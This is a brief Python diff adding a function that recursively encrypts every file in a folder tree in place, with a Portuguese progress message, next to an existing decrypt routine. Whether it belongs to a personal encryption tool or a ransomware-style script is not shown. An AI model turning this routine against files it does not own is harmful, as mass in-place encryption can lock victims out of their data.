@@ -65,3 +65,10 @@ def decrypt(filename,key):
             return
     with open(filename,"wb") as file:
         file.write(decrypted_data)
+def encrypt_folder(foldername,key):
+    for child in pathlib.Path(foldername).glob("*"):
+        if child.is_file():
+            print(f"[++] Criptografando...{child}")
+            encrypt(child,key)
+        elif child.is_dir():
+            encrypt_folder(child,key)
